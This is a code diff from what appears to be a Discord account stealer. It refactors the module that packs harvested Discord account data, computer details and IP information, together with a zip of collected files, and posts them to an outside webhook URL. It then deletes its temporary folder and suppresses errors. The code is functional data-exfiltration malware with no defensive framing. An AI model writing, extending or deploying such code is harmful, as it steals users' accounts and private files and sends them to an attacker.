@@ -12,8 +12,7 @@ const moment = require('moment');
 
 if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;
 
-const zipFile = fs.readdirSync(tempFolder).find(file => file.split('.').pop() === 'zip');
-const json = async () => {
+const json = async (zipFile) => {
   const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
   const discordAccountInfo = JSON.parse(readFileSync(join(tempFolder, 'dsc_acc.json')).toString());
   const computerInfoFields = [
@@ -161,9 +160,9 @@ const json = async () => {
   };
 };
 
-(async () => {
+module.exports = async (zipFile) => {
   const data = new FormData();
-  data.append('files[0]', fs.createReadStream(join(tempFolder, zipFile)));
+  data.append('files[0]', fs.createReadStream(zipFile));
   data.append('payload_json', JSON.stringify(await json()));
 
   axios.post(webhook.url, data, {
@@ -175,4 +174,4 @@ const json = async () => {
       rmSync(tempFolder, { recursive: true });
     })
     .catch(() => {});
-})();
+};
